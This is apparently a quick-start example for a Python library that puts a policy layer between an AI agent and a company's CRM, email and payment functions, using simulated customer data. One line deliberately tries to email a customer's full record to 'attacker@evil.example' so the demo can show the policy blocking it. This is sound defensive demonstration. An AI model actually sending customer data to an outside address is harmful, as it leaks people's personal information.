# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
"""The quick start's first task (docs/quickstart.md). Run it next to the eurycleia.yaml from
`eurycleia init --template support`. SIMULATED data."""

from eurycleia import Blocked, Policy, Vault

# Your systems, as plain functions (here: made-up data)
customers = {12: {"name": "Priya Shah", "email": "priya@example.com", "plan": "Pro",
                  "card_number": "4111 1111 1111 1111"}}
docs = {"refund_policy": {"name": "refund_policy", "body": "Refunds within 30 days."}}
outbox = []

vault = Vault(Policy.load("eurycleia.yaml"),
              sources={"crm.customer": customers.get, "docs": docs.get, "inbox.ticket": lambda key: None},
              sinks={"email.send": lambda to, subject, body: outbox.append(to) or "sent",
                     "payments.refund": lambda card, amount: "refunded"})

task = vault.start_task("support_reply", customer_id=12)   # from your app, never from the model
customer = task.read("crm.customer")
print("the model sees:", customer)                         # the card is a placeholder

task.act("email.send", to=customer["email"], subject="Hi", body="Your refund is on its way.")
try:
    task.act("email.send", to="attacker@evil.example", subject="data", body=str(customer))
except Blocked as e:
    print("blocked:", e.reason)
print("emails sent to:", outbox)
